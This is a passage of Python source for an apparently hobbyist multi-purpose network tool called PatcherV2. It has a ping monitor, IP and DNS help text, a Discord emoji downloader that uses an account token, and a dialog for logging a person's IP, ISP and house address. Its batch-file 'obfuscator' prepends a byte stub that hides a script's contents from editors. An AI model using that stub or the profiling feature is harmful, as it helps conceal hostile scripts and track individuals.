# ██████╗  █████╗ ████████╗ ██████╗██╗  ██╗███████╗██████╗     ██╗   ██╗██████╗      ██████╗ ██████╗ ███╗   ██╗███████╗██╗ ██████╗ 
# ██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║  ██║██╔════╝██╔══██╗    ██║   ██║╚════██╗    ██╔════╝██╔═══██╗████╗  ██║██╔════╝██║██╔════╝ 
# ██████╔╝███████║   ██║   ██║     ███████║█████╗  ██████╔╝    ██║   ██║ █████╔╝    ██║     ██║   ██║██╔██╗ ██║█████╗  ██║██║  ███╗
# ██╔═══╝ ██╔══██║   ██║   ██║     ██╔══██║██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██╔═══╝     ██║     ██║   ██║██║╚██╗██║██╔══╝  ██║██║   ██║
# ██║     ██║  ██║   ██║   ╚██████╗██║  ██║███████╗██║  ██║     ╚████╔╝ ███████╗    ╚██████╗╚██████╔╝██║ ╚████║██║     ██║╚██████╔╝
# ╚═╝     ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝     ╚═╝ ╚═════╝ 
# Everything Below this is all the configurable data for PatcherV2 Tool!

url_scanner_api = "API_KEY_HERE"
weather_lookup_api = "API_KEY_HERE" # Coming in a future update ig this is a leak?? idk



import wx
import socket
import requests
import threading
import subprocess
import ipaddress
import re
from datetime import datetime
import ssl
import whois  # You need to install python-whois: pip install python-whois
import time  # You need to install python-whois: pip install python-whois
from wx.lib.agw import ultimatelistctrl as ULC
import matplotlib
from matplotlib.figure import Figure
import wx.grid
from matplotlib.backends.backend_wxagg import FigureCanvasWxAgg as FigureCanvas
import matplotlib.pyplot as plt
import psutil
import os
import glob
import datetime
from io import BytesIO
import csv
import hashlib
import base64
import uuid
import random
import string
import urllib.parse
import binascii
import ipaddress
import re
from flask import Flask, request
import dns.resolver # pip install dnspython
import smtplib
from PIL import Image
from PIL.ExifTags import TAGS
import os
import fitz # PyMuPDF
import docx # pip install Pillow python-docx PyMuPDF
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from bs4 import BeautifulSoup
from scapy.all import sniff, IP, TCP, UDP, Ether, send, conf, get_if_list, ARP, srp
import wx.html2
import json
import string
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from impacket.nmb import NetBIOS
from ping3 import ping
import wx.dataview as dv
import wx.lib.plot as plot
from wx.lib.plot import PolyLine, PlotGraphics
import itertools
import platform
import wx.lib.scrolledpanel as scrolled
import io
from faker import Faker

fake = Faker()
matplotlib.use('WXAgg')

def hex_to_int_color(hex_color):
    """Convert hex (#rrggbb) to int color for Discord embeds"""
    return int(hex_color.lstrip("#"), 16)

def is_valid_hex_color(color):
    return color.startswith("#") and len(color) == 7

def create_embed_payload(title, description, color, footer, image_url):
    embed = {
        "title": title,
        "description": description,
        "color": color,
    }
    if footer:
        embed["footer"] = {"text": footer}
    if image_url:
        embed["image"] = {"url": image_url}

    return {"embeds": [embed]}

BLACKLISTS = [
        "zen.spamhaus.org",
        "bl.spamcop.net",
        "b.barracudacentral.org",
        "dnsbl.sorbs.net",
        "psbl.surriel.com",
        "spam.dnsbl.sorbs.net",
    ]

def download_emoji(url, save_path):
    try:
        r = requests.get(url)
        if r.status_code == 200:
            with open(save_path, 'wb') as f:
                f.write(r.content)
            return True
    except Exception as e:
        print(f"Error downloading {url}: {e}")
    return False


def get_user_guilds(token):
    headers = {'Authorization': token}
    response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
    return response.json() if response.status_code == 200 else []


def get_guild_emojis(guild_id, token):
    headers = {'Authorization': token}
    response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/emojis", headers=headers)
    return response.json() if response.status_code == 200 else []


def safe_filename(name):
    return "".join(c for c in name if c.isalnum() or c in (' ', '.', '_', '-')).rstrip()


def fetch_emojis_and_download(token, log_func):
    guilds = get_user_guilds(token)
    for guild in guilds:
        guild_name = safe_filename(guild['name'])
        guild_id = guild['id']
        emojis = get_guild_emojis(guild_id, token)

        folder = os.path.join("emojis", guild_name)
        os.makedirs(folder, exist_ok=True)

        for emoji in emojis:
            ext = "gif" if emoji.get("animated") else "png"
            url = f"https://cdn.discordapp.com/emojis/{emoji['id']}.{ext}"
            save_path = os.path.join(folder, f"{emoji['name']}.{ext}")
            success = download_emoji(url, save_path)
            log_func(emoji['name'], guild_name, "Downloaded" if success else "Failed")

def get_nic_display_list():
    raw_interfaces = get_if_list()  # Raw interface names used by scapy/pcapy
    nic_info = psutil.net_if_addrs()  # Nic names with IPs

    display_list = []
    for raw_if in raw_interfaces:
        name = raw_if
        ip = ""

        # Try to find matching nice name and IPv4 address
        for nic_name, addrs in nic_info.items():
            for addr in addrs:
                if addr.family == 2:  # AF_INET (IPv4)
                    # Match either way (raw_if in nic_name or vice versa)
                    if nic_name.lower() in raw_if.lower() or raw_if.lower() in nic_name.lower():
                        name = nic_name
                        ip = addr.address
                        break
            if ip:
                break

        if ip:
            display_name = f"{name} ({ip})"
        else:
            display_name = name
        display_list.append((raw_if, display_name))

    return display_list

class InfoEntryDialog(wx.Dialog):
    def __init__(self, parent, existing_data=None):
        super().__init__(parent, title="Info Entry", size=(400, 450))

        sizer = wx.BoxSizer(wx.VERTICAL)

        self.fields = {}
        labels = ["Name", "IP", "ISP", "City", "State", "Country", "Status", "House Address"]
        for label_text in labels:
            row = wx.BoxSizer(wx.HORIZONTAL)
            label = wx.StaticText(self, label=label_text + ":")
            input_box = wx.TextCtrl(self)
            self.fields[label_text] = input_box

            row.Add(label, 1, wx.ALL | wx.ALIGN_CENTER_VERTICAL, 5)
            row.Add(input_box, 2, wx.ALL | wx.EXPAND, 5)
            sizer.Add(row, 0, wx.EXPAND)

        if existing_data:
            for key in self.fields:
                self.fields[key].SetValue(existing_data.get(key, ""))

        # Use the dialog itself as the parent for buttons
        btn_sizer = self.CreateSeparatedButtonSizer(wx.OK | wx.CANCEL)
        sizer.Add(btn_sizer, 0, wx.ALL | wx.EXPAND, 10)

        self.SetSizer(sizer)
        self.Layout()

    def get_data(self):
        return {key: self.fields[key].GetValue() for key in self.fields}

class FileObfuscatorGUI(wx.Frame):
    def __init__(self, parent=None):
        super().__init__(parent, title="File Obfuscator & Decryptor", size=(850, 600))

        panel = wx.Panel(self)
        notebook = wx.Notebook(panel)

        # Create two panels for the notebook tabs
        self.encrypt_panel = wx.Panel(notebook)
        self.decrypt_panel = wx.Panel(notebook)

        notebook.AddPage(self.encrypt_panel, "Encrypt / Obfuscate")
        notebook.AddPage(self.decrypt_panel, "Decrypt / Deobfuscate / Crack")

        main_sizer = wx.BoxSizer(wx.VERTICAL)
        main_sizer.Add(notebook, 1, wx.EXPAND)
        panel.SetSizer(main_sizer)

        # Build UI for Encrypt Tab
        self.build_encrypt_tab()

        # Build UI for Decrypt Tab
        self.build_decrypt_tab()

    # ----------- Encrypt Tab UI and Logic ------------
    def build_encrypt_tab(self):
        sizer = wx.BoxSizer(wx.VERTICAL)

        file_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.enc_file_path = wx.TextCtrl(self.encrypt_panel, style=wx.TE_READONLY)
        browse_btn = wx.Button(self.encrypt_panel, label="Browse")
        browse_btn.Bind(wx.EVT_BUTTON, self.enc_browse_file)

        file_sizer.Add(wx.StaticText(self.encrypt_panel, label="File:"), 0, wx.ALIGN_CENTER_VERTICAL | wx.RIGHT, 5)
        file_sizer.Add(self.enc_file_path, 1, wx.RIGHT, 5)
        file_sizer.Add(browse_btn, 0)

        sizer.Add(file_sizer, 0, wx.ALL | wx.EXPAND, 5)

        # Obfuscation method choice
        method_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.enc_method_choice = wx.Choice(self.encrypt_panel, choices=[
            "Basic Encode", "Reverse Text", "Hex Encode", "Base64 Stub Obfuscation"
        ])
        self.enc_method_choice.SetSelection(0)
        self.enc_method_choice.Bind(wx.EVT_CHOICE, self.update_security_label)

        method_sizer.Add(wx.StaticText(self.encrypt_panel, label="Method:"), 0, wx.ALIGN_CENTER_VERTICAL | wx.RIGHT, 5)
        method_sizer.Add(self.enc_method_choice, 1)

        sizer.Add(method_sizer, 0, wx.ALL | wx.EXPAND, 5)

        self.security_label = wx.StaticText(self.encrypt_panel, label="")
        sizer.Add(self.security_label, 0, wx.LEFT | wx.BOTTOM, 10)

        self.update_security_label()

        btn_sizer = wx.BoxSizer(wx.HORIZONTAL)
        enc_button = wx.Button(self.encrypt_panel, label="Encrypt / Obfuscate")
        enc_button.Bind(wx.EVT_BUTTON, self.encrypt_file)
        btn_sizer.Add(enc_button, 0)

        sizer.Add(btn_sizer, 0, wx.ALL | wx.CENTER, 10)

        sizer.Add(wx.StaticText(self.encrypt_panel, label="Output Preview / Messages:"), 0, wx.LEFT | wx.TOP, 5)
        self.enc_output_preview = wx.TextCtrl(self.encrypt_panel, style=wx.TE_MULTILINE | wx.TE_READONLY | wx.BORDER_SUNKEN)
        sizer.Add(self.enc_output_preview, 1, wx.ALL | wx.EXPAND, 5)

        self.encrypt_panel.SetSizer(sizer)

    def enc_browse_file(self, event):
        with wx.FileDialog(self, "Choose file to encrypt", wildcard="Batch files (*.bat;*.cmd)|*.bat;*.cmd|All files (*.*)|*.*",
                           style=wx.FD_OPEN | wx.FD_FILE_MUST_EXIST) as dlg:
            if dlg.ShowModal() == wx.ID_OK:
                self.enc_file_path.SetValue(dlg.GetPath())

    def encrypt_file(self, event):
        path = self.enc_file_path.GetValue()
        if not path or not os.path.exists(path):
            wx.MessageBox("Please select a valid file.", "Error", wx.ICON_ERROR)
            return

        method = self.enc_method_choice.GetStringSelection()
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            if method == "Basic Encode":
                obfuscated = ''.join(f"\\x{ord(c):02x}" for c in content)
                self.enc_output_preview.SetValue(obfuscated)

            elif method == "Reverse Text":
                obfuscated = content[::-1]
                self.enc_output_preview.SetValue(obfuscated)

            elif method == "Hex Encode":
                obfuscated = content.encode('utf-8').hex()
                self.enc_output_preview.SetValue(obfuscated)

            elif method == "Base64 Stub Obfuscation":
                # Your obfuscation logic
                b64_encoded = '//4mY2xzDQo='.strip().encode('utf-8')
                decoded_content = base64.b64decode(b64_encoded)

                outfile = f'{os.path.splitext(path)[0]}_obfuscated{os.path.splitext(path)[1]}'
                with open(outfile, 'wb') as f_out:
                    f_out.write(decoded_content)

                with open(outfile, 'ab') as f_out:
                    with open(path, 'rb') as f_in:
                        f_out.write(f_in.read())

                self.enc_output_preview.SetValue(f"Done! Obfuscated and saved as:\n{outfile}")
            else:
                self.enc_output_preview.SetValue(content)

        except Exception as e:
            wx.MessageBox(f"Failed to encrypt file: {e}", "Error", wx.ICON_ERROR)

    def advanced_batch_obfuscate(self, content):
        lines = content.strip().splitlines()
        obfuscated_lines = []
        var_names = []

        for i, line in enumerate(lines):
            var_name = ''.join(random.choices(string.ascii_letters, k=6))
            var_names.append(var_name)
            obfuscated_lines.append(f"set {var_name}={line}")

        obfuscated_lines.append("echo Running obfuscated batch commands...")
        for var in var_names:
            obfuscated_lines.append(f"%{var}%")

        return '\n'.join(obfuscated_lines)

    # ----------- Decrypt Tab UI and Logic ------------
    def build_decrypt_tab(self):
        sizer = wx.BoxSizer(wx.VERTICAL)

        file_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.dec_file_path = wx.TextCtrl(self.decrypt_panel, style=wx.TE_READONLY)
        browse_btn = wx.Button(self.decrypt_panel, label="Browse")
        browse_btn.Bind(wx.EVT_BUTTON, self.dec_browse_file)

        file_sizer.Add(wx.StaticText(self.decrypt_panel, label="File:"), 0, wx.ALIGN_CENTER_VERTICAL | wx.RIGHT, 5)
        file_sizer.Add(self.dec_file_path, 1, wx.RIGHT, 5)
        file_sizer.Add(browse_btn, 0)

        sizer.Add(file_sizer, 0, wx.ALL | wx.EXPAND, 5)

        method_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.dec_method_choice = wx.Choice(self.decrypt_panel, choices=[
            "Basic Decode (\\xHH → char)",
            "Reverse Text",
            "Hex Decode",
            "Try All Methods (Crack Mode)"
        ])
        self.dec_method_choice.SetSelection(0)

        method_sizer.Add(wx.StaticText(self.decrypt_panel, label="Method:"), 0, wx.ALIGN_CENTER_VERTICAL | wx.RIGHT, 5)
        method_sizer.Add(self.dec_method_choice, 1)

        sizer.Add(method_sizer, 0, wx.ALL | wx.EXPAND, 5)

        btn_sizer = wx.BoxSizer(wx.HORIZONTAL)
        dec_button = wx.Button(self.decrypt_panel, label="Decrypt / Deobfuscate / Crack")
        dec_button.Bind(wx.EVT_BUTTON, self.decrypt_file)
        btn_sizer.Add(dec_button, 0)

        sizer.Add(btn_sizer, 0, wx.ALL | wx.CENTER, 10)

        sizer.Add(wx.StaticText(self.decrypt_panel, label="Output Preview / Messages:"), 0, wx.LEFT | wx.TOP, 5)
        self.dec_output_preview = wx.TextCtrl(self.decrypt_panel, style=wx.TE_MULTILINE | wx.TE_READONLY | wx.BORDER_SUNKEN)
        sizer.Add(self.dec_output_preview, 1, wx.ALL | wx.EXPAND, 5)

        self.decrypt_panel.SetSizer(sizer)

    def dec_browse_file(self, event):
        with wx.FileDialog(self, "Choose file to decrypt", wildcard="Batch files (*.bat;*.cmd)|*.bat;*.cmd|All files (*.*)|*.*",
                           style=wx.FD_OPEN | wx.FD_FILE_MUST_EXIST) as dlg:
            if dlg.ShowModal() == wx.ID_OK:
                self.dec_file_path.SetValue(dlg.GetPath())

    def decrypt_file(self, event):
        path = self.dec_file_path.GetValue()
        if not path or not os.path.exists(path):
            wx.MessageBox("Please select a valid file.", "Error", wx.ICON_ERROR)
            return

        method = self.dec_method_choice.GetStringSelection()
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            if method == "Basic Decode (\\xHH → char)":
                chars = re.findall(r'\\x([0-9a-fA-F]{2})', content)
                decoded = ''.join(chr(int(h, 16)) for h in chars)
                self.dec_output_preview.SetValue(decoded)

            elif method == "Reverse Text":
                self.dec_output_preview.SetValue(content[::-1])

            elif method == "Hex Decode":
                try:
                    decoded_bytes = bytes.fromhex(content)
                    decoded = decoded_bytes.decode('utf-8', errors='ignore')
                    self.dec_output_preview.SetValue(decoded)
                except Exception:
                    self.dec_output_preview.SetValue("Error: Content is not valid hex encoded data.")

            elif method == "Try All Methods (Crack Mode)":
                results = []

                try:
                    chars = re.findall(r'\\x([0-9a-fA-F]{2})', content)
                    basic_decoded = ''.join(chr(int(h, 16)) for h in chars)
                    results.append(("Basic Decode", basic_decoded))
                except Exception:
                    results.append(("Basic Decode", "Failed"))

                results.append(("Reverse Text", content[::-1]))

                try:
                    decoded_bytes = bytes.fromhex(content)
                    hex_decoded = decoded_bytes.decode('utf-8', errors='ignore')
                    results.append(("Hex Decode", hex_decoded))
                except Exception:
                    results.append(("Hex Decode", "Failed"))

                combined_result = "\n\n----- Try All Methods Results -----\n\n"
                for method_name, res in results:
                    combined_result += f"Method: {method_name}\n\n{res}\n{'-'*40}\n"

                self.dec_output_preview.SetValue(combined_result)

        except Exception as e:
            wx.MessageBox(f"Failed to decrypt file: {e}", "Error", wx.ICON_ERROR)

    def update_security_label(self, event=None):
        method = self.enc_method_choice.GetStringSelection()
        security_info = {
            "Basic Encode": "Security: Very Low – Simple hex encoding easily reversible.",
            "Reverse Text": "Security: Low – Just reverses text, trivial to reverse.",
            "Hex Encode": "Security: Very Low – Hex encoding is just a representation.",
            "Advanced Batch Obfuscation": "Security: Moderate – Adds randomized obfuscation using environment vars."
        }
        self.security_label.SetLabel(security_info.get(method, "Security: Unknown"))

class IPMonitorPopup(wx.Frame):
    def __init__(self, parent):
        super().__init__(parent, title="Multi-IP Monitor", size=(900, 500))
        self.monitoring = False
        self.ip_threads = {}
        self.ping_data = {}  # {ip: [(timestamp, latency), ...]}
        self.lock = threading.Lock()
        self.colors = itertools.cycle(['red', 'blue', 'green', 'orange', 'purple', 'cyan', 'magenta'])
        self.ip_colors = {}  # IP -> color
        self.graph_duration = 60  # seconds
        self.start_time = time.time()
        self.stop_flags = {}  # Per-IP stop flags for thread control
        self.init_ui()

    def init_ui(self):
        panel = wx.Panel(self)
        vbox = wx.BoxSizer(wx.VERTICAL)

        # IP input bar + Start/Stop + Remove buttons horizontally
        hbox_controls = wx.BoxSizer(wx.HORIZONTAL)
        self.ip_input = wx.TextCtrl(panel, style=wx.TE_PROCESS_ENTER)
        self.ip_input.SetHint("Enter IPs separated by commas, e.g. 8.8.8.8,1.1.1.1")
        self.ip_input.Bind(wx.EVT_TEXT_ENTER, self.on_enter_ips)
        hbox_controls.Add(self.ip_input, 3, wx.EXPAND | wx.ALL, 5)

        self.toggle_btn = wx.Button(panel, label="Start Monitor")
        self.toggle_btn.Bind(wx.EVT_BUTTON, self.on_toggle_monitor)
        hbox_controls.Add(self.toggle_btn, 1, wx.ALL | wx.EXPAND, 5)

        self.remove_btn = wx.Button(panel, label="Remove Selected IP(s)")
        self.remove_btn.Bind(wx.EVT_BUTTON, self.on_remove_selected)
        hbox_controls.Add(self.remove_btn, 2, wx.ALL | wx.EXPAND, 5)

        vbox.Add(hbox_controls, 0, wx.EXPAND)

        # Main content: Left table, right graph
        hbox_main = wx.BoxSizer(wx.HORIZONTAL)

        # Table on left
        self.dvc = dv.DataViewListCtrl(panel, style=wx.BORDER_THEME | dv.DV_ROW_LINES | dv.DV_MULTIPLE)
        self.dvc.AppendTextColumn("IP Address", width=180)
        self.dvc.AppendTextColumn("Latency (ms)", width=120)
        self.dvc.AppendTextColumn("Location", width=180)
        hbox_main.Add(self.dvc, 1, wx.EXPAND | wx.ALL, 5)

        # Graph on right (smaller width)
        self.figure = Figure(figsize=(4,3), dpi=100)
        self.ax = self.figure.add_subplot(111)
        self.canvas = FigureCanvas(panel, -1, self.figure)
        hbox_main.Add(self.canvas, 1, wx.EXPAND | wx.ALL, 5)

        vbox.Add(hbox_main, 1, wx.EXPAND)

        panel.SetSizer(vbox)
        self.Centre()

    def on_enter_ips(self, event):
        if not self.monitoring:
            self.start_monitor()

    def on_toggle_monitor(self, event):
        if self.monitoring:
            self.stop_monitor()
        else:
            self.start_monitor()

    def start_monitor(self):
        ip_text = self.ip_input.GetValue().strip()
        if not ip_text:
            wx.MessageBox("Please enter one or more IPs separated by commas.", "Input required", wx.ICON_WARNING)
            return

        ip_list = [ip.strip() for ip in ip_text.split(",") if ip.strip()]
        if not ip_list:
            wx.MessageBox("No valid IPs detected.", "Input required", wx.ICON_WARNING)
            return

        # Add new IPs if monitoring already started (support dynamic add)
        if not self.monitoring:
            # Fresh start
            self.monitoring = True
            self.toggle_btn.SetLabel("Stop Monitor")
            self.start_time = time.time()
            self.ping_data.clear()
            self.ip_threads.clear()
            self.ip_colors.clear()
            self.stop_flags.clear()
            self.dvc.DeleteAllItems()

        for ip in ip_list:
            if ip in self.ip_threads:
                # Already monitoring this IP, skip
                continue
            self.ping_data[ip] = []
            self.ip_colors[ip] = next(self.colors)
            self.stop_flags[ip] = False
            thread = threading.Thread(target=self.ping_loop, args=(ip,), daemon=True)
            thread.start()
            self.ip_threads[ip] = thread

        # Clear input after adding
        self.ip_input.SetValue("")

    def stop_monitor(self):
        self.monitoring = False
        self.toggle_btn.SetLabel("Start Monitor")
        # Signal all threads to stop
        for ip in self.stop_flags:
            self.stop_flags[ip] = True
        # Optionally join threads here if needed

    def ping_loop(self, ip):
        while self.monitoring and not self.stop_flags.get(ip, True) is True:
            latency = self.ping_ip(ip)
            timestamp = time.time() - self.start_time
            with self.lock:
                self.ping_data[ip].append((timestamp, latency))
                # Keep only last graph_duration seconds
                self.ping_data[ip] = [(t, l) for t, l in self.ping_data[ip] if timestamp - t <= self.graph_duration]

            wx.CallAfter(self.update_ui, ip, latency, "Unknown Location")
            time.sleep(1)

    def ping_ip(self, ip):
        param = '-n' if platform.system().lower()=='windows' else '-c'
        command = ['ping', param, '1', ip]
        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, universal_newlines=True, timeout=2)
            if platform.system().lower() == 'windows':
                import re
                m = re.search(r'Average = (\d+)ms', output)
                if m:
                    return int(m.group(1))
            else:
                import re
                m = re.search(r'time=(\d+\.?\d*) ms', output)
                if m:
                    return int(float(m.group(1)))
        except Exception:
            pass
        return None

    def update_ui(self, ip, latency, location):
        for i in range(self.dvc.GetItemCount()):
            if self.dvc.GetTextValue(i, 0) == ip:
                self.dvc.SetTextValue(str(latency) if latency is not None else "Timeout", i, 1)
                self.dvc.SetTextValue(location, i, 2)
                break
        else:
            self.dvc.AppendItem([ip, str(latency) if latency is not None else "Timeout", location])

        self.update_graph()

    def update_graph(self):
        self.ax.clear()
        ips = list(self.ping_data.keys())
        latest_latencies = []
        for ip in ips:
            if self.ping_data[ip]:
                # get latest latency
                latest_latencies.append(self.ping_data[ip][-1][1] or 0)
            else:
                latest_latencies.append(0)

        bars = self.ax.bar(ips, latest_latencies, color=[self.ip_colors.get(ip, 'blue') for ip in ips])
        self.ax.set_ylim(0, max(latest_latencies + [100]))  # fixed max or dynamic
        self.ax.set_title("Current Ping per IP")
        self.ax.set_ylabel("Latency (ms)")
        self.ax.set_xlabel("IP Address")
        self.ax.grid(axis='y')
        self.canvas.draw()

    def on_remove_selected(self, event):
        selections = self.dvc.GetSelections()
        for item in selections:
            row = self.dvc.ItemToRow(item)
            ip = self.dvc.GetTextValue(row, 0)  # Assuming IP is in column 0
            if ip in self.ping_data:
                del self.ping_data[ip]
            if ip in self.ip_colors:
                del self.ip_colors[ip]
            self.dvc.DeleteItem(item)
        self.update_graph()


class HelpWindow(wx.Frame):
    def __init__(self, parent=None):
        super().__init__(parent, title="Help Menu", size=(700, 500))
        self.Center()
        self.SetDoubleBuffered(True)

        # Main vertical sizer
        main_sizer = wx.BoxSizer(wx.VERTICAL)

        # Search box at top
        self.search_ctrl = wx.SearchCtrl(self, style=wx.TE_PROCESS_ENTER)
        self.search_ctrl.ShowSearchButton(True)
        self.search_ctrl.ShowCancelButton(True)
        main_sizer.Add(self.search_ctrl, 0, wx.EXPAND | wx.ALL, 5)

        # Splitter window to allow draggable resizing
        self.splitter = wx.SplitterWindow(self)
        self.splitter.SetMinimumPaneSize(150)
        main_sizer.Add(self.splitter, 1, wx.EXPAND)

        # Tree control (left pane)
        self.tree = wx.TreeCtrl(self.splitter, style=wx.TR_HAS_BUTTONS)
        self.root = self.tree.AddRoot("Help Topics")

        # Store original items for filtering
        self.all_items = []

        # Build tree items
        self.build_tree()

        self.tree.ExpandAll()

        # Scrollable text panel (right pane)
        text_panel = scrolled.ScrolledPanel(self.splitter)
        text_panel.SetupScrolling()

        self.help_text = wx.TextCtrl(
            text_panel,
            style=wx.TE_MULTILINE | wx.TE_READONLY | wx.TE_WORDWRAP,
            size=(-1, -1),
        )

        text_sizer = wx.BoxSizer(wx.VERTICAL)
        text_sizer.Add(self.help_text, 1, wx.EXPAND | wx.ALL, 5)
        text_panel.SetSizer(text_sizer)

        # Split window
        self.splitter.SplitVertically(self.tree, text_panel, sashPosition=200)

        self.SetSizer(main_sizer)

        # Bind events
        self.tree.Bind(wx.EVT_TREE_SEL_CHANGED, self.on_tree_selection)
        self.search_ctrl.Bind(wx.EVT_TEXT, self.on_search)

        self.help_content = {

            "What is an IP Address?": (
                "An IP address (Internet Protocol address) is a unique numerical label assigned to each device "
                "connected to a computer network that uses the Internet Protocol for communication.\n\n"
                "There are two main versions:\n"
                "• IPv4 (e.g., 192.168.1.1): 32-bit addresses, widely used.\n"
                "• IPv6 (e.g., 2001:0db8:85a3::8a2e:0370:7334): 128-bit, created to solve IPv4 exhaustion.\n\n"
                "IP addresses serve two main purposes:\n"
                "1. Host or network interface identification\n"
                "2. Location addressing"
            ),

            "Public vs Private IPs": (
                "IP addresses can be either public or private.\n\n"
                "Public IPs:\n"
                "• Routable on the Internet\n"
                "• Assigned by ISPs\n"
                "• Example: 8.8.8.8 (Google DNS)\n\n"
                "Private IPs:\n"
                "• Used within local networks (home, office, etc.)\n"
                "• Not routable on the Internet\n"
                "• Common ranges:\n"
                "   • 192.168.0.0 – 192.168.255.255\n"
                "   • 10.0.0.0 – 10.255.255.255\n"
                "   • 172.16.0.0 – 172.31.255.255"
            ),

            "Loopback and Reserved Addresses": (
                "Certain IP ranges are reserved for special purposes:\n\n"
                "Loopback Address:\n"
                "• 127.0.0.1 refers to the local machine (localhost).\n"
                "• Used for testing and diagnostics.\n\n"
                "Reserved Addresses:\n"
                "• 0.0.0.0: Represents an invalid, unknown, or default route.\n"
                "• 255.255.255.255: Broadcast address to send to all devices in a network.\n"
                "• 169.254.x.x: APIPA (Automatic Private IP Addressing) range for fallback addressing."
            ),

            "What is NAT?": (
                "NAT (Network Address Translation) is a technique used by routers to allow multiple devices "
                "on a local network to share a single public IP address.\n\n"
                "Key Benefits of NAT:\n"
                "• Conserves public IP addresses\n"
                "• Adds a layer of privacy and security\n\n"
                "How it works:\n"
                "• Your local device (e.g., 192.168.1.5) makes a request to the Internet.\n"
                "• The router replaces the source IP with the public IP.\n"
                "• When a response comes back, the router forwards it to the correct local device."
            ),

            "CIDR and Subnetting Basics": (
                "CIDR (Classless Inter-Domain Routing) is a method for allocating IP addresses more efficiently.\n\n"
                "Format:\n"
                "• IP address followed by a slash and subnet length (e.g., 192.168.1.0/24)\n\n"
                "How to Read:\n"
                "• /24 means the first 24 bits are the network part.\n"
                "• That leaves 8 bits for hosts (256 total IPs, minus 2 reserved).\n\n"
                "Subnetting divides a network into smaller sub-networks, helping manage traffic and improve security."
            ),

            "DNS Resolution Process": (
                "DNS (Domain Name System) converts human-readable domain names (like google.com) into IP addresses.\n\n"
                "Resolution Steps:\n"
                "1. You enter a domain in your browser.\n"
                "2. The OS checks the DNS cache.\n"
                "3. If not found, it asks the configured DNS server (e.g., 8.8.8.8).\n"
                "4. That server may recursively query:\n"
                "   • Root DNS servers\n"
                "   • TLD servers (like .com)\n"
                "   • Authoritative servers\n"
                "5. The correct IP is returned and your device connects to it.\n\n"
                "DNS responses are cached for faster performance next time."
            ),

            "Known Public DNS Servers": (
                "Known Public DNS Servers:\n\n"
                "1.1.1.1 (Cloudflare DNS):\n"
                "  • Very fast and privacy-focused.\n"
                "  • Does not log IP addresses.\n"
                "  • IPv6: 2606:4700:4700::1111\n\n"
                "8.8.8.8 (Google Public DNS):\n"
                "  • Reliable and globally distributed.\n"
                "  • Good for resolving domains quickly.\n"
                "  • IPv6: 2001:4860:4860::8888\n\n"
                "9.9.9.9 (Quad9 DNS):\n"
                "  • Blocks malicious domains (security-focused).\n"
                "  • Non-logging and privacy-conscious.\n"
                "  • IPv6: 2620:fe::fe\n\n"
                "208.67.222.222 (OpenDNS by Cisco):\n"
                "  • Offers web filtering and parental controls.\n"
                "  • Requires account for customization.\n"
                "  • IPv6: 2620:119:35::35\n\n"
                "64.6.64.6 (Verisign Public DNS):\n"
                "  • Focuses on stability and privacy.\n"
                "  • No DNS redirecting or ad injection.\n\n"
                "185.228.168.9 (CleanBrowsing DNS):\n"
                "  • Blocks adult content (Family filter).\n"
                "  • Free and configurable options.\n\n"
                "Why are these useful?\n"
                "• They can resolve domain names faster than your ISP’s DNS.\n"
                "• Some block malicious or adult content by default.\n"
                "• Helpful when your network is experiencing DNS issues.\n"
                "• Useful for privacy-focused users or parental control setups.\n"
            ),

            "IP Lookup": (
                "Retrieve geolocation, ISP, ASN, and organizational details of an IP address. Useful for tracing origins of traffic, threat analysis, or identifying suspicious users."
            ),
            "DNS Lookup": (
                "Query DNS records (A, MX, TXT, etc.) for a domain to reveal how it's structured and identify mail servers, SPF policies, or service endpoints."
            ),
            "NSLookup": (
                "Perform detailed DNS diagnostics by querying specific servers for domain records. Useful for resolving DNS issues or confirming propagation."
            ),
            "Port Scanner": (
                "Scan TCP/UDP ports on a target system to identify open services. Helps assess attack surfaces or verify firewall configurations."
            ),
            "Ping Tool": (
                "Send ICMP echo requests to test host reachability and measure response time. Useful for network health checks and latency diagnostics."
            ),
            "Traceroute": (
                "Map the network route to a destination host by revealing each intermediate hop and measuring latency per hop. Key for diagnosing routing issues."
            ),
            "Subnet Calculator": (
                "Calculate subnets, CIDR ranges, and host limits. Useful for designing efficient network segments and avoiding IP conflicts."
            ),
            "MAC Address Lookup": (
                "Lookup the vendor or manufacturer of a device using its MAC address. Helpful in identifying devices in large or unknown networks."
            ),
            "Reverse IP Lookup": (
                "Identify domain names hosted on a specific IP address. Useful for investigating shared hosting environments or potential related targets."
            ),
            "SSL/TLS Checker": (
                "Analyze SSL/TLS certificates on web servers to verify validity, issuer, expiration, and supported encryption protocols. Critical for secure communication checks."
            ),
            "HTTP Header Viewer": (
                "Inspect HTTP headers such as cookies, content types, server banners, and caching. Useful for debugging, security analysis, and fingerprinting."
            ),
            "WHOIS Lookup": (
                "Retrieve domain registration details, ownership, registrar, and expiration. Helpful in OSINT and domain control verification."
            ),
            "IP Blacklist Checker": (
                "Check if an IP address appears on major threat blacklists like Spamhaus or Barracuda. Assists with email reputation and abuse tracking."
            ),
            "Network Speed Test": (
                "Measure download, upload, and latency of your connection. Helps detect throttling, ISP issues, or performance bottlenecks."
            ),
            "Cloudflare Scanner": (
                "Determine whether a site is using Cloudflare and identify its protection layers. Useful for OSINT or when attempting to uncover original server IPs."
            ),
            "Host Monitor": (
                "Continuously ping and monitor host response times. Ideal for tracking uptime, latency, or intermittent network issues."
            ),
            "Website2IP": (
                "Convert domain names into IP addresses using DNS resolution. Aids in traceroutes, scanning, or accessing sites behind domain names."
            ),
            "Subdomain Scanner": (
